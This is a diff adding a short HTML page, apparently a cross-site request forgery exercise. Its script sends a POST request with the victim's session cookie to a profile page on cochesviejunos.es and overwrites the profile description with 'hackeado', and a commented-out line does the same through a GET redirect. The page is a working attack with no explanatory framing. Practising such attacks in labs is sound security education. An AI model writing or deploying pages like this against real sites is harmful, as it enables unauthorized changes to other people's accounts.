@@ -1,0 +1,15 @@
+<html>
+  <body>
+    <script>
+     // window.location = "https://cochesviejunos.es/profile.php?username=p_user&description=HackedCSRF";
+    
+    
+    fetch('https://cochesviejunos.es/profile.php', {
+    method: 'POST',
+    credentials: 'include',  // ← manda la cookie de sesión
+    body: 'description=hackeado'
+})
+    
+    </script>
+  </body>
+</html>
